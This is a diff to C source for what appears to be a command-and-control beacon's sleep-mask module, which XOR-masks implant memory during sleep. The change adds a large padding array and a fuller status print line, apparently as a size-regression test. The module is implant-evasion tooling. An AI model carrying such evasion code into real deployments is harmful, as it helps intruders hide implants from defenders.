@@ -83,6 +83,14 @@ typedef struct {
 	ULONG_PTR   retValue;
 } K_FUNCTION_CALL;
 
+#ifdef BIG
+/* the region test: built with /DBIG=1 (CI: sleepmask410_big.x64.o), this
+ * object is past the old 16K patch limit. It reaches a beacon only
+ * through a region that grew (the x64 sleeve publishes 64K); the done
+ * line carries its first byte and size, so a run proves it ran whole. */
+static unsigned char g_pad[40000] = { 0x5a };
+#endif
+
 static void xor_range(char * p, SIZE_T n, const char * key)
 {
 	SIZE_T i;
@@ -232,5 +240,10 @@ void sleep_mask(K_BEACON_INFO * info, K_FUNCTION_CALL * fc)
 	if (fc->bMask)
 		unmask_beacon(info);
 
+#ifdef BIG
+	BeaconPrintf(CALLBACK_OUTPUT, "sm410: done fn=%d ret=%llx pad=%x/%d", fc->function,
+	             (unsigned long long)fc->retValue, g_pad[0], (int)sizeof(g_pad));
+#else
 	BeaconPrintf(CALLBACK_OUTPUT, "sm410: done fn=%d ret=%llx", fc->function, (unsigned long long)fc->retValue);
+#endif
 }
